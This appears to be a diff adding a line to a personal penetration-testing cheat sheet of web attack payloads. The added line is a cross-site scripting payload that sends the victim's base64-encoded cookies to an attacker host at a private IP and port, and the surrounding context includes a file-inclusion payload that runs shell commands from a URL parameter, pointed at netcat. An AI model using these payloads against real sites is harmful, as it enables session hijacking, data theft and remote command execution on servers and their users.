@@ -125,6 +125,8 @@ web
 
         <iframe src="http://192.168.1.140" height="30" width="40"> </iframe>
 
+	<script>fetch('http://10.11.140.117:9001?cookie='+btoa(document.cookie));</script>  // get cookie, and // is comment for js
+
 file inclusion
     data:text/plain,<?php%20$var=shell_exec($_GET[%27cmd%27]);%20echo%20$var%20?>&cmd=/bin/nc* 
 
